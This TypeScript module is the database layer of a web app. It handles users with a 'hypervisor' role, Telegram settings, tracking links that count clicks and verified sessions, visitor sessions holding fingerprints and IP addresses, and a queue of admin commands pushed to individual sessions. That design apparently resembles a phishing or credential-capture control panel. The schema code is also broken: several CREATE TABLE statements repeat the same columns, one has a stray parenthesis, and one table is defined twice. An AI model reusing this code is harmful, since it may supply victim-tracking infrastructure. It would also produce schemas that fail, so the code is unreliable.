import sqlite3 from 'sqlite3';
import { Pool } from 'pg';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import { ensureHashedPassword } from './utils/password';

// --- Configuration ---
const DATA_DIR = process.env['DATA_DIR'] || './data';
const DATABASE_URL = process.env['DATABASE_URL'];

let sqliteDb: sqlite3.Database | null = null;
let pgPool: Pool | null = null;

const isPostgres = !!DATABASE_URL;

// --- Initialization ---

export const initDB = async () => {
    if (isPostgres) {
        console.log('[DB] Connecting to PostgreSQL...');

        // SECURITY: Configure SSL based on environment
        let sslConfig: boolean | { rejectUnauthorized: boolean } = false;
        const isLocalhost = DATABASE_URL?.includes('localhost') || DATABASE_URL?.includes('127.0.0.1');

        if (isLocalhost) {
            // No SSL for local development
            sslConfig = false;
        } else if (process.env['DB_SSL_REJECT_UNAUTHORIZED'] === 'false') {
            // Allow explicit disable for cloud providers that use self-signed certs
            console.warn('[DB] ⚠️  SSL certificate verification disabled. Use only with trusted providers.');
            sslConfig = { rejectUnauthorized: false };
        } else if (process.env['NODE_ENV'] === 'production') {
            // Production: require SSL with verification
            sslConfig = true;
        } else {
            // Development: SSL without strict verification
            sslConfig = { rejectUnauthorized: false };
        }

        pgPool = new Pool({
            connectionString: DATABASE_URL,
            ssl: sslConfig
        });

        try {
            await pgPool.query('SELECT 1');
            console.log('[DB] Connected to PostgreSQL.');
            await initPostgresSchema();
        } catch (e) {
            console.error('[DB] PostgreSQL Connection Error:', e);
            process.exit(1);
        }
    } else {
        // SQLite Fallback
        if (!fs.existsSync(DATA_DIR)) {
            fs.mkdirSync(DATA_DIR, { recursive: true });
        }
        const DB_PATH = path.join(DATA_DIR, 'sessions.db');
        console.log(`[DB] Initializing SQLite database at ${DB_PATH}`);

        sqliteDb = new sqlite3.Database(DB_PATH, (err) => {
            if (err) console.error('[DB] SQLite Connection Error:', err.message);
            else console.log('[DB] Connected to SQLite database.');
        });

        await initSqliteSchema();
    }
};

const seedHypervisor = async () => {
    // SECURITY: Load credentials from environment variables instead of hardcoding
    const username = process.env['HYPERVISOR_USERNAME'];
    const password = process.env['HYPERVISOR_PASSWORD'];

    if (!username || !password) {
        if (process.env['NODE_ENV'] === 'production') {
            console.warn('[DB] ⚠️  HYPERVISOR_USERNAME and HYPERVISOR_PASSWORD not set. No admin account will be created.');
            console.warn('[DB] ⚠️  Set these environment variables to create an initial admin account.');
        } else {
            console.log('[DB] Hypervisor credentials not configured. Skipping seed in development mode.');
        }
        return;
    }

    // Check if exists first to avoid duplicates on restart
    const exists = await getUserByUsername(username);
    if (!exists) {
        const hyperUser = {
            id: crypto.randomUUID(),
            username,
            password, // Will be hashed by createUser via ensureHashedPassword
            role: 'hypervisor',
            uniqueCode: crypto.randomUUID().substring(0, 8),
            settings: JSON.stringify({}),
            telegramConfig: JSON.stringify({}),
            maxLinks: 100
        };
        console.log('[DB] Seeding Hypervisor from environment variables...');
        await createUser(hyperUser);
        console.log('[DB] ✅ Hypervisor account created.');
    }

    // SECURITY: Removed hardcoded secondary admin - create admins via the dashboard
};

const runSqlite = (sql: string, params: any[] = []): Promise<void> => {
    return new Promise((resolve, reject) => {
        sqliteDb!.run(sql, params, (err) => {
            if (err) reject(err);
            else resolve();
        });
    });
};

const initSqliteSchema = async () => {
    if (!sqliteDb) return;

    // 1. Create Tables
    await runSqlite(`
        CREATE TABLE IF NOT EXISTS users (
            id TEXT PRIMARY KEY,
            username TEXT UNIQUE,
            password TEXT,
            role TEXT,
            uniqueCode TEXT UNIQUE,
            settings TEXT,
            telegramConfig TEXT,
            maxLinks INTEGER DEFAULT 1,
            isSuspended BOOLEAN DEFAULT 0
        )
    `);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            data TEXT,
            lastSeen INTEGER,
            ip TEXT,
            lastSeen INTEGER,
            ip TEXT,
            adminId TEXT,
            variant TEXT,
            FOREIGN KEY(adminId) REFERENCES users(id)
        )
    `);

    // Indices
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_sessions_lastSeen ON sessions (lastSeen)`);
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_sessions_adminId ON sessions (adminId)`);
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_users_username ON users (username)`);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS admin_commands (
            sessionId TEXT PRIMARY KEY,
            action TEXT,
            payload TEXT
        )
    `);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    `);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS admin_links (
            code TEXT PRIMARY KEY,
            adminId TEXT,
            clicks INTEGER DEFAULT 0,
            sessions_started INTEGER DEFAULT 0,
            sessions_verified INTEGER DEFAULT 0,
            created_at INTEGER,
            flow_config TEXT DEFAULT '{}',
            theme_config TEXT DEFAULT '{}',
            ab_config TEXT DEFAULT '{}',
            FOREIGN KEY(adminId) REFERENCES users(id)
        )
    `);

    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_links_code ON admin_links (code)`);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp INTEGER,
            actor TEXT,
            action TEXT,
            details TEXT
        )
    `);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS session_notes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sessionId TEXT,
            content TEXT,
            author TEXT,
            timestamp INTEGER,
            FOREIGN KEY(sessionId) REFERENCES sessions(id)
        )
    `);
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_notes_sessionId ON session_notes (sessionId)`);

    // 2. Migrations (Try/Catch to ignore "duplicate column")
    try {
        await runSqlite(`ALTER TABLE users ADD COLUMN maxLinks INTEGER DEFAULT 1`);
    } catch (e: any) {
        if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (maxLinks):', e.message);
    }

    try {
        await runSqlite(`ALTER TABLE users ADD COLUMN isSuspended BOOLEAN DEFAULT 0`);
    } catch (e: any) {
        if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (isSuspended):', e.message);
    }

    try {
        await runSqlite(`ALTER TABLE admin_links ADD COLUMN flow_config TEXT DEFAULT '{}'`);
    } catch (e: any) {
        if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (flow_config):', e.message);
    }

    try {
        await runSqlite(`ALTER TABLE admin_links ADD COLUMN theme_config TEXT DEFAULT '{}'`);
    } catch (e: any) {
        if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (theme_config):', e.message);
    }

    try {
        await runSqlite(`ALTER TABLE admin_links ADD COLUMN ab_config TEXT DEFAULT '{}'`);
    } catch (e: any) {
        if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (ab_config):', e.message);
    }

    // 3. Seed
    await seedHypervisor();

    // SECURITY: Do not set default gate credentials
    // Gate credentials must be explicitly configured via admin panel or environment variables
    try {
        const settings = await getSettings();
        if (!settings.gateUser || !settings.gatePass) {
            console.warn('[DB] ⚠️  Gate credentials not configured. Configure via admin panel or environment.');
        }
    } catch (e) { console.error('Failed to check gate settings', e); }
};

const initPostgresSchema = async () => {
    if (!pgPool) return;
    const client = await pgPool.connect();
    try {
        // Migration: Add maxLinks
        try {
            await client.query('ALTER TABLE users ADD COLUMN maxLinks INTEGER DEFAULT 1');
        } catch (e) { /* Ignore if exists */ }
        // Migration: Add isSuspended
        try {
            await client.query('ALTER TABLE users ADD COLUMN isSuspended BOOLEAN DEFAULT FALSE');
        } catch (e) { /* Ignore if exists */ }
        // Migration: Add variant to sessions
        try {
            await client.query('ALTER TABLE sessions ADD COLUMN variant TEXT');
        } catch (e) { /* Ignore if exists */ }
        // Migration: Add flow_config
        try {
            await client.query('ALTER TABLE admin_links ADD COLUMN flow_config TEXT DEFAULT \'{}\'');
        } catch (e) { /* Ignore if exists */ }
        // Migration: Add theme_config
        try {
            await client.query('ALTER TABLE admin_links ADD COLUMN theme_config TEXT DEFAULT \'{}\'');
        } catch (e) { /* Ignore if exists */ }
        // Migration: Add ab_config
        try {
            await client.query('ALTER TABLE admin_links ADD COLUMN ab_config TEXT DEFAULT \'{}\'');
        } catch (e) { /* Ignore if exists */ }

        await client.query(`
            CREATE TABLE IF NOT EXISTS users (
                id TEXT PRIMARY KEY,
                username TEXT UNIQUE,
                password TEXT,
                role TEXT,
                uniqueCode TEXT UNIQUE,
                settings TEXT,
                telegramConfig TEXT,
                maxLinks INTEGER DEFAULT 1,
                isSuspended BOOLEAN DEFAULT FALSE
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                data TEXT,
                lastSeen BIGINT,
                ip TEXT,
                lastSeen BIGINT,
                ip TEXT,
                adminId TEXT,
                variant TEXT
            )
            )
        `);

        await client.query(`CREATE INDEX IF NOT EXISTS idx_sessions_lastSeen ON sessions (lastSeen)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_sessions_adminId ON sessions (adminId)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_users_username ON users (username)`);
        // NOTE: idx_links_code moved below after admin_links table is created

        await client.query(`
            CREATE TABLE IF NOT EXISTS admin_commands (
                sessionId TEXT PRIMARY KEY,
                action TEXT,
                payload TEXT
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        `);

        // New Tables
        await client.query(`
            CREATE TABLE IF NOT EXISTS admin_links (
                code TEXT PRIMARY KEY,
                adminId TEXT,
                clicks INTEGER DEFAULT 0,
                sessions_verified INTEGER DEFAULT 0,
                created_at BIGINT,
                flow_config TEXT DEFAULT '{}',
                created_at BIGINT,
                flow_config TEXT DEFAULT '{}',
                theme_config TEXT DEFAULT '{}',
                ab_config TEXT DEFAULT '{}'
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS audit_logs (
                id SERIAL PRIMARY KEY,
                timestamp BIGINT,
                actor TEXT,
                action TEXT,
                details TEXT
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS session_notes (
                id SERIAL PRIMARY KEY,
                sessionId TEXT,
                content TEXT,
                author TEXT,
                timestamp BIGINT
            )
        `);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_notes_sessionId ON session_notes (sessionId)`);

        await client.query(`
            CREATE TABLE IF NOT EXISTS session_notes (
                id SERIAL PRIMARY KEY,
                sessionId TEXT,
                content TEXT,
                author TEXT,
                timestamp BIGINT
            )
        `);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_notes_sessionId ON session_notes (sessionId)`);

        // Create index for admin_links AFTER table is created
        await client.query(`CREATE INDEX IF NOT EXISTS idx_links_code ON admin_links (code)`);

        await seedHypervisor();

        // SECURITY: Do not set default gate credentials
        // Gate credentials must be explicitly configured via admin panel or environment variables
        const s = await getSettings();
        if (!s.gateUser || !s.gatePass) {
            console.warn('[DB] ⚠️  PostgreSQL: Gate credentials not configured. Configure via admin panel.');
        }

    } finally {
        client.release();
    }
};

// --- User Management ---

export const createUser = async (user: any): Promise<void> => {
    const { id, username, password, role, uniqueCode, settings, telegramConfig, maxLinks } = user;
    const links = maxLinks || (role === 'hypervisor' ? 100 : 1);
    const suspended = user.isSuspended || false;
    const hashedPassword = password ? await ensureHashedPassword(password) : password;

    if (isPostgres) {
        const query = `
            INSERT INTO users (id, username, password, role, uniqueCode, settings, telegramConfig, maxLinks, isSuspended)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
        `;
        await pgPool!.query(query, [id, username, hashedPassword, role, uniqueCode, settings, telegramConfig, links, suspended]);
    } else {
        const query = `
            INSERT INTO users (id, username, password, role, uniqueCode, settings, telegramConfig, maxLinks, isSuspended)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        `;
        await new Promise<void>((resolve, reject) => {
            sqliteDb!.run(query, [id, username, hashedPassword, role, uniqueCode, settings, telegramConfig, links, suspended], (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
    }

    try {
        await createLink(id, uniqueCode);
    } catch (e) {
        console.error('Failed to create default link', e);
    }
};

export const backfillDefaultLinks = async (): Promise<void> => {
    try {
        const users = await getAllUsers();
        for (const user of users) {
            const existing = await getLinkByCode(user.uniqueCode);
            if (!existing) {
                console.log(`[DB] Backfilling default link for ${user.username} (${user.uniqueCode})`);
                await createLink(user.id, user.uniqueCode);
            }
        }
    } catch (e) {
        console.error('[DB] Failed to backfill links:', e);
    }
};

export const updateUser = async (id: string, updates: any): Promise<void> => {
    const current = await getUserById(id);
    if (!current) {
        throw new Error('User not found');
    }

    const normalizedUpdates = { ...updates };
    if (normalizedUpdates.password) {
        normalizedUpdates.password = await ensureHashedPassword(normalizedUpdates.password);
    }

    const u = { ...current, ...normalizedUpdates };

    if (isPostgres) {
        const query = `
            UPDATE users SET username=$1, password=$2, role=$3, uniqueCode=$4, settings=$5, telegramConfig=$6, maxLinks=$7, isSuspended=$8
            WHERE id=$9
        `;
        await pgPool!.query(query, [u.username, u.password, u.role, u.uniqueCode, u.settings, u.telegramConfig, u.maxLinks, u.isSuspended, id]);
    } else {
        const query = `
            UPDATE users SET username=?, password=?, role=?, uniqueCode=?, settings=?, telegramConfig=?, maxLinks=?, isSuspended=?
            WHERE id=?
        `;
        await new Promise<void>((resolve, reject) => {
            sqliteDb!.run(query, [u.username, u.password, u.role, u.uniqueCode, u.settings, u.telegramConfig, u.maxLinks, u.isSuspended, id], (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
    }
};

export const deleteUser = (id: string): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('DELETE FROM users WHERE id = $1', [id]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run('DELETE FROM users WHERE id = ?', [id], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const deleteLink = (code: string): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('DELETE FROM admin_links WHERE code = $1', [code]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run('DELETE FROM admin_links WHERE code = ?', [code], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const getUserById = (id: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM users WHERE id = $1', [id])
                .then(res => resolve(res.rows[0]))
                .catch(reject);
        } else {
            sqliteDb!.get('SELECT * FROM users WHERE id = ?', [id], (err, row) => {
                if (err) reject(err);
                else resolve(row);
            });
        }
    });
};

export const getUserByUsername = (username: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM users WHERE username = $1', [username])
                .then(res => resolve(res.rows[0]))
                .catch(reject);
        } else {
            sqliteDb!.get('SELECT * FROM users WHERE username = ?', [username], (err, row) => {
                if (err) reject(err);
                else resolve(row || null);
            });
        }
    });
};

export const getUserByCode = (code: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM users WHERE uniqueCode = $1', [code])
                .then(res => resolve(res.rows[0]))
                .catch(reject);
        } else {
            sqliteDb!.get('SELECT * FROM users WHERE uniqueCode = ?', [code], (err, row) => {
                if (err) reject(err);
                else resolve(row);
            });
        }
    });
};

export const getAllUsers = (): Promise<any[]> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM users')
                .then(res => resolve(res.rows))
                .catch(reject);
        } else {
            sqliteDb!.all('SELECT * FROM users', [], (err, rows) => {
                if (err) reject(err);
                else resolve(rows as any[]);
            });
        }
    });
};

// --- Links Management ---

export const createLink = (adminId: string, code: string): Promise<void> => {
    const now = Date.now();
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query(`INSERT INTO admin_links (code, adminId, created_at, flow_config, theme_config, ab_config) VALUES ($1, $2, $3, $4, $5, $6)`, [code, adminId, now, '{}', '{}', '{}'])
                .then(() => resolve())
                .catch(reject);
        } else {
            sqliteDb!.run(`INSERT INTO admin_links (code, adminId, created_at, flow_config, theme_config, ab_config) VALUES (?, ?, ?, ?, ?, ?)`, [code, adminId, now, '{}', '{}', '{}'], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const getLinks = (adminId?: string): Promise<any[]> => {
    return new Promise((resolve, reject) => {
        let sql = 'SELECT * FROM admin_links';
        const params: any[] = [];
        // Only filter if adminId is provided AND it's not a Hypervisor view request.
        // But here we rely on the caller to pass undefined for Hypervisor.
        if (adminId) {
            sql += ' WHERE adminId = ?';
            params.push(adminId);
        }
        sql += ' ORDER BY created_at DESC';

        if (isPostgres) {
            if (adminId) sql = sql.replace('?', '$1');
            pgPool!.query(sql, params)
                .then(res => {
                    // Normalize PostgreSQL lowercase column names
                    const links = res.rows.map(row => ({
                        code: row.code,
                        adminId: row.adminid,
                        clicks: row.clicks,
                        sessions_started: row.sessions_started,
                        sessions_verified: row.sessions_verified,
                        created_at: row.created_at,
                        flow_config: row.flow_config ? JSON.parse(row.flow_config) : {},
                        theme_config: row.theme_config ? JSON.parse(row.theme_config) : {},
                        ab_config: row.ab_config ? JSON.parse(row.ab_config) : {}
                    }));
                    resolve(links);
                })
                .catch(reject);
        } else {
            sqliteDb!.all(sql, params, (err, rows: any[]) => {
                if (err) reject(err);
                else {
                    const links = rows.map(r => ({
                        ...r,
                        flow_config: r.flow_config ? JSON.parse(r.flow_config) : {},
                        theme_config: r.theme_config ? JSON.parse(r.theme_config) : {},
                        ab_config: r.ab_config ? JSON.parse(r.ab_config) : {}
                    }));
                    resolve(links);
                }
            });
        }
    });
};

export const getLinkByCode = (code: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM admin_links WHERE code = $1', [code])
                .then(res => {
                    const row = res.rows[0];
                    if (row) {
                        // Normalize PostgreSQL lowercase column names
                        // Handle automatic JSON parsing by pg driver
                        const parseConfig = (val: any) => {
                            if (!val) return {};
                            if (typeof val === 'string') {
                                try { return JSON.parse(val); } catch (e) { return {}; }
                            }
                            return val;
                        };

                        resolve({
                            code: row.code,
                            adminId: row.adminid,
                            clicks: row.clicks,
                            sessions_started: row.sessions_started,
                            sessions_verified: row.sessions_verified,
                            created_at: row.created_at,
                            flow_config: parseConfig(row.flow_config),
                            theme_config: parseConfig(row.theme_config),
                            ab_config: parseConfig(row.ab_config)
                        });
                    } else {
                        resolve(null);
                    }
                })
                .catch(reject);
        } else {
            sqliteDb!.get('SELECT * FROM admin_links WHERE code = ?', [code], (err, row: any) => {
                if (err) reject(err);
                else {
                    const parseConfig = (val: any) => {
                        if (!val) return {};
                        if (typeof val === 'string') {
                            try { return JSON.parse(val); } catch (e) { return {}; }
                        }
                        return val;
                    };
                    resolve(row ? {
                        ...row,
                        flow_config: parseConfig(row.flow_config),
                        theme_config: parseConfig(row.theme_config),
                        ab_config: parseConfig(row.ab_config)
                    } : null);
                }
            });
        }
    });
};

export const incrementLinkClicks = (code: string): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('UPDATE admin_links SET clicks = clicks + 1 WHERE code = $1', [code]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run('UPDATE admin_links SET clicks = clicks + 1 WHERE code = ?', [code], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const incrementLinkSessions = (code: string, type: 'started' | 'verified'): Promise<void> => {
    const col = type === 'started' ? 'sessions_started' : 'sessions_verified';
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query(`UPDATE admin_links SET ${col} = ${col} + 1 WHERE code = $1`, [code]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run(`UPDATE admin_links SET ${col} = ${col} + 1 WHERE code = ?`, [code], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const updateLinkConfig = (code: string, config: any, type: 'flow' | 'theme' | 'ab' = 'flow'): Promise<void> => {
    const json = JSON.stringify(config);
    let col = 'flow_config';
    if (type === 'theme') col = 'theme_config';
    if (type === 'ab') col = 'ab_config';
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query(`UPDATE admin_links SET ${col} = $1 WHERE code = $2`, [json, code]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run(`UPDATE admin_links SET ${col} = ? WHERE code = ?`, [json, code], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

// --- Audit Logs ---

export const logAudit = (actor: string, action: string, details: string): Promise<void> => {
    const now = Date.now();
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query(`INSERT INTO audit_logs (timestamp, actor, action, details) VALUES ($1, $2, $3, $4)`, [now, actor, action, details])
                .then(() => resolve())
                .catch(e => { console.error('Audit Log Error', e); resolve(); });
        } else {
            sqliteDb!.run(`INSERT INTO audit_logs (timestamp, actor, action, details) VALUES (?, ?, ?, ?)`, [now, actor, action, details], (err) => {
                if (err) console.error('Audit Log Error', err);
                resolve();
            });
        }
    });
};

export const getAuditLogs = (limit = 100): Promise<any[]> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM audit_logs ORDER BY timestamp DESC LIMIT $1', [limit])
                .then(res => resolve(res.rows))
                .catch(reject);
        } else {
            sqliteDb!.all('SELECT * FROM audit_logs ORDER BY timestamp DESC LIMIT ?', [limit], (err, rows: any[]) => {
                if (err) reject(err);
                else resolve(rows);
            });
        }
    });
};

// --- Settings ---

export const getSettings = (): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM settings')
                .then(res => {
                    const settings: any = {};
                    res.rows.forEach(r => settings[r.key] = r.value);
                    resolve(settings);
                })
                .catch(reject);
        } else {
            sqliteDb!.all('SELECT * FROM settings', [], (err, rows: any[]) => {
                if (err) return reject(err);
                const settings: any = {};
                rows.forEach(r => settings[r.key] = r.value);
                resolve(settings);
            });
        }
    });
};

export const updateSetting = (key: string, value: string): Promise<void> => {
    const query = `
        INSERT INTO settings (key, value) VALUES ($1, $2)
        ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value
    `;
    const sqliteQuery = `INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)`;

    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query(query, [key, value]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run(sqliteQuery, [key, value], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

// --- Sessions ---

export const getSession = (id: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM sessions WHERE id = $1', [id])
                .then(res => {
                    const row = res.rows[0];
                    if (row) {
                        resolve({ ...JSON.parse(row.data), id: row.id, lastSeen: Number(row.lastseen), ip: row.ip, adminId: row.adminid });
                    } else {
                        resolve(null);
                    }
                })
                .catch(reject);
        } else {
            sqliteDb!.get('SELECT * FROM sessions WHERE id = ?', [id], (err, row: any) => {
                if (err) return reject(err);
                if (row) {
                    resolve({ ...JSON.parse(row.data), id: row.id, lastSeen: row.lastSeen, ip: row.ip, adminId: row.adminId });
                } else {
                    resolve(null);
                }
            });
        }
    });
};

export const getSessionsByIp = (ip: string): Promise<any[]> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM sessions WHERE ip = $1', [ip])
                .then(res => {
                    const sessions = res.rows.map(r => {
                        const data = JSON.parse(r.data);
                        return { ...data, id: r.id, lastSeen: Number(r.lastseen), ip: r.ip, adminId: r.adminid };
                    });
                    resolve(sessions);
                })
                .catch(reject);
        } else {
            sqliteDb!.all('SELECT * FROM sessions WHERE ip = ?', [ip], (err, rows: any[]) => {
                if (err) return reject(err);
                const sessions = rows.map(r => {
                    const data = JSON.parse(r.data);
                    return { ...data, id: r.id, lastSeen: r.lastSeen, ip: r.ip, adminId: r.adminId };
                });
                resolve(sessions);
            });
        }
    });
};

export const upsertSession = (id: string, data: any, ip: string, adminId: string | null = null, variant: string | null = null): Promise<void> => {
    const json = JSON.stringify(data);
    const now = Date.now();

    return new Promise((resolve, reject) => {
        if (isPostgres) {
            const query = `
                INSERT INTO sessions (id, data, lastSeen, ip, adminId, variant)
                VALUES ($1, $2, $3, $4, $5, $6)
                ON CONFLICT(id) DO UPDATE SET
                data = EXCLUDED.data,
                lastSeen = EXCLUDED.lastSeen,
                ip = EXCLUDED.ip,
                adminId = COALESCE($5, sessions.adminId),
                variant = COALESCE($6, sessions.variant)
            `;
            pgPool!.query(query, [id, json, now, ip, adminId, variant]).then(() => resolve()).catch(reject);
        } else {
            const query = `
                INSERT INTO sessions (id, data, lastSeen, ip, adminId, variant)
                VALUES (?, ?, ?, ?, ?, ?)
                ON CONFLICT(id) DO UPDATE SET
                data = excluded.data,
                lastSeen = excluded.lastSeen,
                ip = excluded.ip,
                adminId = COALESCE(?, sessions.adminId),
                variant = COALESCE(?, sessions.variant)
            `;
            sqliteDb!.run(query, [id, json, now, ip, adminId, variant, adminId, variant], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const updateSessionAdmin = (sessionId: string, adminId: string | null): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('UPDATE sessions SET adminId = $1 WHERE id = $2', [adminId, sessionId])
                .then(() => resolve())
                .catch(reject);
        } else {
            sqliteDb!.run('UPDATE sessions SET adminId = ? WHERE id = ?', [adminId, sessionId], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
}

export const updateLastSeen = (id: string, lastSeen: number): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('UPDATE sessions SET lastSeen = $1 WHERE id = $2', [lastSeen, id])
                .then(() => resolve())
                .catch(reject);
        } else {
            sqliteDb!.run('UPDATE sessions SET lastSeen = ? WHERE id = ?', [lastSeen, id], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const getAllSessions = (adminId?: string, role?: string): Promise<any[]> => {
    return new Promise((resolve, reject) => {
        let sql = 'SELECT * FROM sessions ';
        const params: any[] = [];

        // Logic:
        // Hypervisor: See ALL sessions (no WHERE clause)
        // Admin/Viewer: See ONLY assigned sessions (WHERE adminId = ?)

        if (role === 'hypervisor' && !adminId) {
            // No filter - show everything
        } else if (adminId) {
            sql += 'WHERE adminId = ? ';
            params.push(adminId);
        } else {
            // Safety: If not hypervisor and no adminId, return nothing (or handle appropriate error)
            // For now, we'll return empty to be safe if auth logic fails earlier
            if (isPostgres) {
                return resolve([]);
            } else {
                return resolve([]);
            }
        }

        sql += 'ORDER BY lastSeen DESC';

        if (isPostgres) {
            // Replace ? with $1
            if (params.length > 0) sql = sql.replace('?', '$1');

            pgPool!.query(sql, params)
                .then(res => {
                    const sessions = res.rows.map(r => {
                        const data = JSON.parse(r.data);
                        if (!data.fingerprint) data.fingerprint = {};
                        data.fingerprint.ip = r.ip;
                        return {
                            ...data,
                            id: r.id,
                            lastSeen: Number(r.lastseen),
                            ip: r.ip,
                            adminId: r.adminid
                        };
                    });
                    resolve(sessions);
                })
                .catch(reject);
        } else {
            sqliteDb!.all(sql, params, (err, rows: any[]) => {
                if (err) return reject(err);
                const sessions = rows.map(r => {
                    const data = JSON.parse(r.data);
                    if (!data.fingerprint) data.fingerprint = {};
                    data.fingerprint.ip = r.ip;
                    return {
                        ...data,
                        id: r.id,
                        lastSeen: r.lastSeen,
                        ip: r.ip,
                        adminId: r.adminId
                    };
                });
                resolve(sessions);
            });
        }
    });
};

export const deleteSession = (id: string): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('DELETE FROM sessions WHERE id = $1', [id]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run('DELETE FROM sessions WHERE id = ?', [id], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const queueCommand = (sessionId: string, action: string, payload: any): Promise<void> => {
    const json = JSON.stringify(payload);

    // Postgres Syntax
    const pgQuery = `
        INSERT INTO admin_commands (sessionId, action, payload) VALUES ($1, $2, $3)
        ON CONFLICT (sessionId) DO UPDATE SET action = EXCLUDED.action, payload = EXCLUDED.payload
    `;

    // SQLite Syntax
    const sqliteQuery = `INSERT OR REPLACE INTO admin_commands (sessionId, action, payload) VALUES (?, ?, ?)`;

    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query(pgQuery, [sessionId, action, json]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run(sqliteQuery, [sessionId, action, json], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const getCommand = (sessionId: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            // Postgres supports RETURNING on DELETE, which allows atomic pop
            pgPool!.query('DELETE FROM admin_commands WHERE sessionId = $1 RETURNING *', [sessionId])
                .then(res => {
                    if (res.rows.length > 0) {
                        const row = res.rows[0];
                        resolve({ action: row.action, payload: JSON.parse(row.payload) });
                    } else {
                        resolve(null);
                    }
                })
                .catch(reject);
        } else {
            // SQLite: Use serialize to ensure atomic read-then-delete
            sqliteDb!.serialize(() => {
                sqliteDb!.get('SELECT * FROM admin_commands WHERE sessionId = ?', [sessionId], (err, row: any) => {
                    if (err) return reject(err);
                    if (row) {
                        sqliteDb!.run('DELETE FROM admin_commands WHERE sessionId = ?', [sessionId], (delErr) => {
                            if (delErr) console.error('[DB] Delete command error:', delErr);
                            resolve({ action: row.action, payload: JSON.parse(row.payload) });
                        });
                    } else {
                        resolve(null);
                    }
                });
            });
        }
    });
};

